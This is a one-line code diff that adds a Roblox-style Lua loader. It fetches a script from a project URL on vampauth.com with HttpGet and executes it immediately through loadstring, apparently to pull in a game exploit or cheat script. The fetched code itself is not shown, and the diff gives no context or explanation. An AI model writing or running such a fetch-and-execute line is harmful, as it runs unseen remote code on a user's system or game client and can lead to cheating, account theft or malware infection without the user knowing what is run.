@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://vampauth.com/api/projects/56a25006-3f46-4aa0-bfb3-fd6c41fc35a1/scripts/stelanegg"))()
